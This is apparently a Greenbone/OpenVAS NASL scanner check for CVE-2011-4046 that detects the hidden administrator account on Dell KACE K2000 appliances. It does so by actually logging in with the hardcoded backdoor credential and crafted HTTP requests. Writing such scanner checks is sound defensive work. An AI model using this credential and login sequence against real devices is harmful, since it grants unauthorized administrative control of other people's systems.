CPE = "cpe:/a:quest:kace_systems_management_appliance";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103318" );
	script_cve_id( "CVE-2011-4046" );
	script_bugtraq_id( 50605 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_version( "2020-03-11T14:32:35+0000" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Dell KACE K2000 Backdoor" );
	script_tag( name: "last_modification", value: "2020-03-11 14:32:35 +0000 (Wed, 11 Mar 2020)" );
	script_tag( name: "creation_date", value: "2011-11-11 11:42:28 +0100 (Fri, 11 Nov 2011)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_quest_kace_sma_detect.sc" );
	script_mandatory_keys( "quest_kace_sma/detected", "quest_kace_sma/model" );
	script_tag( name: "summary", value: "The Dell KACE K2000 System Deployment Appliance contains a hidden
  administrator account that allow a remote attacker to take control of an affected device." );
	script_tag( name: "solution", value: "Update to version 3.7 or later." );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/135606" );
	script_xref( name: "URL", value: "http://www.kace.com/support/kb/index.php?action=artikel&id=1120&artlang=en" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
model = get_kb_item( "quest_kace_sma/model" );
if(model != "K2000"){
	exit( 0 );
}
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
req = http_get( item: "/", port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
session_id = eregmatch( pattern: "Set-Cookie: (kboxid=[^;]+)", string: buf );
if(isnull( session_id[1] )){
	exit( 0 );
}
sess = session_id[1];
up = "kbox1248163264128256";
url = "/_login";
host = http_host_name( port: port );
ex = NASLString( "LOGIN_NAME=", up, "&LOGIN_PASSWORD=", up, "&save=Login" );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded;\\r\\n", "Connection: Close\\r\\n", "Cookie: ", sess, "\\r\\n", "Content-Length: ", strlen( ex ), "\\r\\n", "\\r\\n", ex );
res = http_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 30" )){
	loc = "/tasks";
	req = NASLString( "GET ", loc, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", sess, "\\r\\n", "Connection: Keep-Alive\\r\\n\\r\\n" );
	res = http_send_recv( port: port, data: req );
	if(ContainsString( res, "Logged in as: kbox" ) && ContainsString( res, "Log Out" )){
		report = "It was possible to log in with the hidden administrator account.";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

